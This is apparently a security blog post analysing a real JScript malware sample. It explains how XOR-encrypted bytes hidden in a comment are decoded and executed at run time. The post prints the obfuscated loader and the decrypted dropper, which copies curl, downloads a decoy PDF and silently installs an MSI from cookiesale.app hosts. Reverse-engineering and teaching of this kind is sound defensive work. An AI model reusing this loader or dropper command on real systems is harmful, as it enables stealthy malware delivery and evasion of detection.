+++
title = "When Comments Aren't Comments: Decoding An Obfuscated JavaScript Sample"
date = 2026-07-12T00:00:00-00:00
draft = false
summary = "An obfuscated JavaScript sample was observed on a device with an oddly large comment block at the top of the code.  Students of programming are often taught that comments are not part of code itself and serve no other purpose other than to provide explanations for code blocks. In this article, we explore why that isn't always true."
tags = ["deobfuscation-lab","javascript", "jscript", "malware", "reverse-engineering"]
+++

When learning any given programming language for the first time, it is almost guaranteed that at one point the instructor will mention comments and their usage to document code to provide details into how the code works: expanding on a variable name, outlining how a function works, or explaining how a class is to be used.  The conversation pretty much stops there. While that holds true for nearly all legitimate use cases, malware authors challenge this convention by coming up with ever increasingly clever ways to obfuscate their code. In this article, we will tear apart a real-world malware sample that leverages commented XOR-encrypted ASCII decimal bytes to dynamically compile new JavaScript code at run time with the goal of bypassing static string detection mechanisms.

One clarifying note before we begin: This sample is technically the now-deprecated _JScript_ language, Microsoft's implementation of the ECMAScript standard. It's technically also JavaScript, just the use of some specific host objects that we'll see shortly (e.g., ActiveXObject, WScript) make it land in JScript territory. I use both terms somewhat interchangeably in this article.

## The Obfuscated JavaScript Sample

We begin by looking at the below JavaScript sample, which notably had a name matching a known user account in the organization followed by a 5-digit suffix prior to the file name, the generalized form being: `<userPrincipalName>-<#####>.js`. We will spend this section deobfuscating this code, and the following section identifying what this deobfuscated code actually does (or more accurately, attempts to do, as any EDR solution worth its salt should prevent this from even landing on an endpoint).

```
// 62 20 1 73 5 42 5 106 76 90 38 16 4 73 34 58 30 35 7 31 16 58 17 3 6 58 30 98 83 41 43 7 26 25 23 48 4 45 95 60 33 25 22 58 26 42 30 47 28 53 42 31 22 10 23 123 67 113 124 112 62 20 1 73 20 42 2 25 25 31 36 25 83 84 67 55 15 61 81 59 43 1 26 31 6 1 37 40 27 31 43 1 91 75 52 10 9 56 24 10 60 91 32 1 6 53 6 104 88 65 69 127 5 8 17 121 31 57 20 8 38 20 30 12 67 100 74 61 2 18 27 29 22 5 15 119 47 50 1 27 38 17 54 7 21 48 24 37 31 23 45 27 7 58 23 43 3 36 22 9 96 87 86 60 48 28 56 4 48 55 13 80 81 64 88 84 96 60 16 8 104 19 26 5 6 28 18 35 2 14 59 85 78 73 5 42 5 100 55 19 36 16 54 17 10 42 30 57 89 88 11 79 47 53 54 42 15 56 2 38 20 87 83 66 67 44 25 47 3 20 41 24 22 73 72 121 72 22 45 59 56 5 55 8 23 56 54 22 61 21 43 20 31 53 63 13 15 39 1 38 20 16 31 47 48 1 28 14 6 24 41 91 22 17 6 123 67 113 124 112 33 19 83 65 5 48 6 47 52 2 33 6 7 26 74 121 17 71 123 119 66 8 83 12 15 42 15 106 10 119 66 85 83 73 67 47 11 56 81 9 32 16 31 5 67 100 74 36 20 13 104 52 16 29 10 47 15 18 62 24 34 16 16 29 75 123 61 25 18 8 33 5 7 71 48 49 15 38 29 88 97 78 126 99 67 121 74 106 7 27 58 85 16 6 14 52 11 36 21 90 117 85 84 10 14 61 74 101 18 90 43 17 83 70 7 121 72 9 75 38 20 32 0 12 17 42 54 22 84 47 27 48 33 39 34 20 47 111 45 38 9 5 3 45 2 45 11 22 45 54 39 22 18 5 63 5 62 47 28 10 20 41 81 73 69 121 9 37 1 3 104 22 73 53 63 46 3 36 21 21 63 6 47 53 16 32 25 62 20 23 123 71 47 53 0 44 24 38 95 31 48 16 83 12 15 31 57 18 7 62 63 23 18 71 6 33 15 106 87 90 45 25 53 58 59 47 46 61 19 27 102 16 11 12 67 116 5 106 83 57 114 41 47 60 16 60 24 57 45 38 109 32 32 44 49 23 43 7 52 95 20 41 55 6 0 44 7 47 31 14 59 41 47 63 14 28 32 15 60 28 4 12 37 71 19 61 12 104 81 18 60 1 3 26 89 118 69 41 30 22 39 7 18 13 12 119 9 37 30 17 33 16 0 8 15 60 68 43 1 10 103 17 28 30 13 53 5 43 21 85 56 17 21 73 69 121 72 9 75 38 20 32 0 12 17 42 54 22 84 47 27 48 33 39 34 20 47 111 45 38 12 26 16 28 14 60 4 62 2 38 20 35 30 44 41 28 39 44 61 3 30 91 3 13 5 123 74 108 81 31 36 51 32 49 21 29 29 40 16 84 45 13 22 73 78 54 74 48 53 34 41 26 5 62 55 9 43 100 28 9 33 85 27 29 23 41 25 112 94 85 46 25 28 27 10 61 11 100 18 21 39 30 26 12 16 56 6 47 95 27 56 5 92 13 12 46 4 38 30 27 44 90 18 14 6 55 30 106 87 90 11 79 47 53 52 48 4 46 30 13 59 41 47 58 26 42 30 47 28 73 122 41 47 4 16 48 15 50 20 25 102 16 11 12 67 118 3 106 11 62 16 20 28 31 52 13 58 11 95 23 59 28 83 70 18 55 77 113 124 112 104 85 83 73 16 49 15 38 29 84 26 0 29 65 0 54 7 39 16 20 44 89 83 89 79 121 12 43 29 9 45 92 72 100 105 36

var ovhK=new ActiveXObject("Scripting.FileSystemObject");
var jYPw=ovhK.OpenTextFile(WScript.ScriptFullName,1);
var CexN=jYPw.ReadAll().split('\n')[0].substring(3);
var DSYi=CexN.split(' ')
var MAcK='';

for(var i=0;i<DSYi.length;i++){
	MAcK += String.fromCharCode(DSYi[i]^"HusicYjJqz".charCodeAt(i%"HusicYjJqz".length));
	}
var ZYik=new Function(MAcK);
ZYik();

 // lH1b29zgUkcvKPRzK0GixXVlxLYvxSWuazvS13aLTlu2rOWVM42oiyYrDVFLdnVzv0txpAycw1wyFUdBzN2FRzUo32zBCNBMrtdMO4xpaUyGxY7JdQvdvQFa1d7vAlf4R2Ys4DtvxmsIsPy1HpPsDxohNEE3cmacSF555VFsu6LW8bSXhUHq46OW1XbEH9yzVbpoy8Iphw76RraNxTY9q9uEBHq0IqGQJPw9XWqJu0z5lMLuZQw8GWv0TQzdT4vA1d9A07ZjndqRqH37KuLL7CWo6xolWamxKTp3M8Xun9cZHxzooO7tO03ztH3UuxusHN4xqPbTk3dvUnyJR1MUjp79iXGELyXvtDGtdSm5tJ2yAArXKUB9M2zzzmhJ32SGX3YaSb6tGn9ASsYHVIUXhQBtGyUc4cXwuGdTP0CVFTanAIIgCK9OpuEkejE4zdWMkKYKzieZKKKfNMC3TCbhZYI1dsflVL7PrIKjezSf5QIFoZJCRm6J6nOfG16TIk7H7MklsPPOGYDPymoUsszLI2ve0wvIJLEMVvBKRkiI9Af4IAGzl9druKZoigfRjzp8PM3VE2rwOuFimsSlLnFV5MVKjrCzkXyqFfVARpsjXOerjN9Uo4JuHt44RoNMzgrFDbP3YIJ3IfeJIyxQYWNwzYNOC34ba6A97QzNQjwDjPX4nxRXNP2Uf6VdVDM9aBg6nRpYSRbzV68UzS9bH2ax87iDbJEdBaC8DqCvBORi3jiqqef69fu1hXIZi3uf9bhUl67STu0BYZ0cEjoOhJFknoNnZV29IwgdZUW5iStx27gO0p3BQWoJegn122tuGnN94Iyrg0w4UZ40ClK6xNxyz9vSqEyDQrC4KSPjIfTONEtqI1aJwZtTyfxEp7v9zreZo4Vy4FeRNdoG0j9Qkbts8ZNpVGFUYVVr2yj6w60fmsh4NWPa8aUCmI1ksPVmOkLG2tGWa5KhI4gnI0vqSh2U9UtRKXUfVQe2UHGAKXQEXYzLwwLYtRHH2ANj83XEPohp

```

The sample begins with a large comment block of what appears to be decimal byte values, but trying to translate the first few to ASCII quickly leads to gibberish: **>**, followed by two non-ASCII bytes, then **I**...so we'll table that for a moment. The next line, `var ovhK=new ActiveXObject("Scripting.FileSystemObject")`, is legacy JScript code used to interact with the host file system, setting that to the variable `ovhK`. We will see this pattern of setting a variable and then building upon that variable in the next step as a new variable. The following line, `var jYPw=ovhK.OpenTextFile(WScript.ScriptFullName,1)`, now builds upon this by calling the legacy method `OpenTextFile()` and passing the argument `WScript.ScriptFullName`, which is the script currently being executed: the sample is now opening itself, with the 2nd argument to the previous method being the value `1`, denoting read only access.

The next line is where the fun begins. With an open reading frame into itself, the malicious JavaScript now sets yet another new variable: `var CexN=jYPw.ReadAll().split('\n')[0].substring(3)`, reading its entire content, but splitting on a new line, grabbing only the data held within index 0 (which happens to be the decimal byte comment), and finally trimming the first 3 characters (in this case the two forward slashes to denote the comment, and the space that follows them) by calling the `substring()` method, ultimately leaving the `CexN` variable holding only the decimal bytes and nothing more. The following 2 lines in this code block first split these bytes into an array with `var DSYi=CexN.split(' ')` with each decimal byte value now holding its own index position in the array, and finally creating the variable `MAcK` with `var MAcK=''`, which will be used to store the soon-to-be decoded payload for execution.

Up next we finally reach the runtime decryption routine, which takes the shape of a _**repeating-key XOR cipher**_; a `for` loop that iterates over the encrypted decimal byte array `DSYi` against the statically coded key of `HusicYjJqz` to decrypt the main logic for this malware sample. While certainly one of the less advanced code obfuscation techniques, it's still worth dissecting exactly how this works, so let's take a look at that now.

## Understanding the Repeating-Key XOR Cipher

The main XOR decryption technique in this sample is as follows:

```
for(var i=0;i<DSYi.length;i++){
    MAcK += String.fromCharCode(DSYi[i]^"HusicYjJqz".charCodeAt(i%"HusicYjJqz".length));
}
```

For starters, we identify that this `for` loop is building out the main program logic one loop at a time, with each loop generating a single character as a result of the `String.fromCharCode()` method being called and concatenated onto the `MAcK` variable. Within this method call we see that we are iterating over every single byte in the decimal byte array `DSYi` as seen with `DSYi[i]` over the length  of `DSYi`. In this sample, `DSYi[0]` = `62`, `DSYi[1]` = `20`, `DSYi[2]` = `1`, and so on.

What shows us that this is a repeating-key XOR cipher is the value being XOR'd against - in this case, `"HusicYjJqz".charCodeAt(i%"HusicYjJqz".length)`. Working from the right-hand side first, `i%"HusicYjJqz".length` is what enables this to be a repeating key. `"HusicYjJqz".length` evaluates to `10`, because the key string is 10 characters long. So while `i` is between **0-9**, the result of the modulo operation (`%`) against the key's length is just the value of `i` itself. The `.charCodeAt()` method returns the Unicode code point (which for ASCII characters is just the ASCII value) at that index. Using `i = 0` as an example, `DSYi[0] = 62` and `"HusicYjJqz".charCodeAt(0%"HusicYjJqz".length)` becomes `"HusicYjJqz".charCodeAt(0)`, or simply `H`, which happens to have an ASCII value of 72. We can then XOR 62 against 72, resulting in the value of 118, which is the ASCII value for a lowercase _v_. We'll prove this again in just a moment. Want to check my XOR match? You can do it yourself with my [Bitwise Arithmetic Lab here](/tools/bitwise_arithmetic_lab.html).

As `i` progresses from 0 through 9, we iterate through the key one character at a time, XORing against the corresponding decimal byte in the byte array. Upon reaching `i` = 10, we start back at the beginning of the key (10 % 10 = 0), and continue repeating the XOR process across this key until the entire byte array has been decrypted.

## The XOR-Decrypted Payload

It certainly wouldn't be difficult to modify this sample itself, or generate another small program to perform this XOR decryption routine for us, but we can simplify this even more by turning to our good friend CyberChef to decrypt this for us. The below image shows our recipe beginning with the "From Decimal" command, followed by "XOR", and entering our 10-character long key "HusicYjJqz". See the following screenshot from CyberChef showing the decrypted payload, which also exists in a standalone code block below.

![JavaScript XOR Decoded](/images/javascript_xor_decryption.png)

```
var fso = new ActiveXObject("Scripting.FileSystemObject");
var wshShell = new ActiveXObject("WScript.Shell");
var username = wshShell.ExpandEnvironmentStrings("%USERNAME%");
var fileExists = fso.FileExists("C:\\Users\\" + username + "\\AppData\\Local\\Temp\\elFSXvDwba.exe");
if (fileExists) {

} else {
    var shell = new ActiveXObject("WScript.Shell");
    var command = 'cmd /c cd /d "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\" & copy c:\\windows\\system32\\curl.exe elFSXvDwba.exe & elFSXvDwba.exe -o "C:\\Users\\%USERNAME%\\Documents\\VmEJEMfLyV.pdf" https://colorado.cookiesale.app/download/pdf & "C:\\Users\\%USERNAME%\\Documents\\VmEJEMfLyV.pdf" & elFSXvDwba.exe -o zDXaovWTPA.msi https://florida.cookiesale.app/download/agent & C:\\Windows\\System32\\msiexec.exe /i zDXaovWTPA.msi /qn';
    shell.Run(command, 0, false);
}
```

I won't go into as much detail breaking down this code as a) I've already explained what a good amount of those method calls do and b) if you've read this far, you likely can make sense of this pretty well anyway. But I do want to highlight something I really enjoy about this code that I call **the poor man's mutex**.

## The Poor Man's Mutex

Mutexes are legitimate programming primitives that allow programs to essentially "lock" certain sections of code to prevent multiple threads from accessing a shared resource simultaneously, which could obviously have disasterous consequences if, for example, two threads attempted to modify a specific value in a database at the same time. Mutexes, however, are also a favorite of malware authors to identify previously infected hosts. Malware authors know that there is no point in attempting to re-infect an already infected host, so some malware will leverage an often hard-coded mutex name to create a new uniquely named mutex on an infected victim.  The same malware also checks if that named mutex already exists; if it does, the host is already infected, and the malware will often simply exit to prevent an attempted re-infection (which could lead to an increased chance of detection if undetected the first time).

This particular sample, however, does this "Have I already infected this victim check?" in a much simpler, almost laughable way. If you inspected the above code, you noticed this malware placed a renamed version of `curl.exe`, now called `elFSXvDwba.exe`, in the user's Temp directory. It performs an `if/else` logical check to see if this renamed curl exists, and if so, simply does nothing, and essentially exits and ends further execution. Similar infection check as a mutex, but in a much more rudimentary way.

## Wrapping It Up

As I bring this article to an end, you may be asking why I didn't touch on the next stage in this malicious execution chain, the msi installer `zDXaovWTPA.msi` that the curl request reached out and grabbed from the `cookiesale.app` domain. Unfortunately, the truth is that though this sample was seen recently, it is actually an incredibly old sample, with other samples sharing similar or identical indicators dating to almost 10 years old (which is also supported by the use of now deprecated JScript tooling). Unfortunately, the domains seen in this sample are long extinct, though one would assume the follow-on payload is able to be found somewhere out there if one were to look hard enough. Overall, this article sought to showcase some interesting obfuscation techniques leveraged by threat actors, and show how they can be unraveled and decoded to make sense of what the threat actors were trying to accomplish. Never assume that obscure-looking comments in code are meaningless. They just might have a hidden, malicious purpose.